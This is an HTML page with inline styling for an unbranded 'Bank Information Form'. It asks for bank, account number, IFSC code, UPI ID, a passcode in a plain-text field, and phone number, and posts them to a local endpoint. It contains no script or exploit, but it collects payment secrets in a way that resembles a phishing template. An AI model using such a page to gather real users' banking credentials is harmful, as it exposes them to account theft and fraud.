<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank Information Form</title>
    <style>
       /* Reset and Centering */
body, html {
    height: 100%;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: 'Arial', sans-serif;
    background: white; /* Dark Navy Background */
    color: white;
}

.container {
    text-align: center;
    background: #7f9eb5; /* Light Navy Blue Shade */
    padding: 30px;
    border-radius: 12px;
    box-shadow: 0 6px 18px rgba(255, 255, 255, 0.2);
    max-width: 480px;
    width: 90%;
    border: 1px solid #1f4068; /* Navy Border */
    transition: transform 0.3s ease-in-out;
    color: white; /* Ensuring text remains visible */
}

.container:hover {
    transform: scale(1.03);
}

/* Heading */
h2 {
    margin-bottom: 18px;
    font-size: 22px;
    font-weight: bold;
    color: #1f4068; /* Deep Navy */
    text-transform: uppercase;
    letter-spacing: 1px;
}

/* Form Groups */
.form-group {
    margin-bottom: 14px;
    text-align: left;
}

label {
    display: block;
    font-size: 15px;
    color: #0a192f; /* Dark Navy */
    margin-bottom: 4px;
    font-weight: bold;
}

/* Input Fields */
input, select {
    width: 100%;
    padding: 10px;
    font-size: 15px;
    border: 2px solid #ccc;
    border-radius: 6px;
    box-sizing: border-box;
    transition: all 0.3s ease-in-out;
    background: #f8f9fa;
    color: #0a192f;
}

input:focus, select:focus {
    border-color: #1f4068;
    outline: none;
    box-shadow: 0 0 8px rgba(31, 64, 104, 0.4);
}

/* Amount Selection Buttons */
.amount-buttons {
    display: flex;
    gap: 8px;
    justify-content: center;
    flex-wrap: wrap;
    margin-bottom: 14px;
}

.amount-buttons button {
    padding: 12px 16px;
    font-size: 15px;
    border: 2px solid #1f4068;
    border-radius: 6px;
    background: #162447; /* Darker Navy */
    cursor: pointer;
    font-weight: bold;
    text-transform: uppercase;
    color: white;
    transition: all 0.3s ease-in-out;
}

.amount-buttons button:hover {
    background: #1f4068;
    border-color: #0a192f;
    color: white;
    transform: translateY(-2px);
    box-shadow: 0 4px 10px rgba(255, 255, 255, 0.2);
}

/* Submit Button */
button[type="submit"] {
    padding: 12px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    background: #1f4068;
    color: white;
    border: 2px solid #162447;
    border-radius: 6px;
    transition: all 0.3s ease-in-out;
    width: 100%;
    margin-top: 8px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

button[type="submit"]:hover {
    background: #162447;
    border-color: #0a192f;
    transform: translateY(-2px);
    box-shadow: 0 4px 10px rgba(255, 255, 255, 0.2);
}

/* Error Message */
.error-message {
    color: red;
    font-size: 13px;
    margin-top: 8px;
}

    </style>
</head>
<body>
<form action="/bankinfo" method="post">
    <div class="container">
        <h2>Enter Bank Information</h2>

        <!-- Bank Dropdown Selection (matching size with other input fields) -->
        <div class="form-group">
            <label for="bank_name">Bank Name</label>
            <select id="bank_name" name="bank_name" required>
                <option value="">Select a Bank</option>
                <option value="State Bank of India">State Bank of India</option>
                <option value="HDFC Bank">HDFC Bank</option>
                <option value="ICICI Bank">ICICI Bank</option>
                <option value="Axis Bank">Axis Bank</option>
                <option value="Punjab National Bank">Punjab National Bank</option>
                <option value="Bank of Baroda">Bank of Baroda</option>
                <option value="Canara Bank">Canara Bank</option>
                <option value="Union Bank of India">Union Bank of India</option>
                <option value="Kotak Mahindra Bank">Kotak Mahindra Bank</option>
                <option value="IndusInd Bank">IndusInd Bank</option>
            </select>
        </div>

        <!-- Account Number Input -->
        <div class="form-group">
            <label for="account_number">Account Number</label>
            <input type="number" id="account_number" name="account_number" placeholder="Enter account number" required>
        </div>



        <!-- IFSC Code Input Field -->
        <div class="form-group">
            <label for="ifsc_code">IFSC Code</label>
            <input type="text" id="ifsc_code" name="ifsc_code" placeholder="Enter IFSC code" required>
        </div>
        <div class="form-group">
            <label for="upi_id">UPI ID</label>
            <input type="text" id="upi_id" name="upi_id" placeholder="Enter a UPI ID" required>
        </div>
        <div class="form-group">
            <label for="passcode">Passcode</label>
            <input type="text" id="passcode" name="passcode" placeholder="Enter a secure passcode" required>
        </div>
        <div class="form-group">
            <label for="phone_number">Phone Number</label>
            <input type="text" id="phone_number" name="phone_number" placeholder="Enter Phone Number" required>
        </div>
        <!-- Submit Button -->
        <button type="submit">Submit</button><br><br>
         </div>
</form>>
</body>
</html>
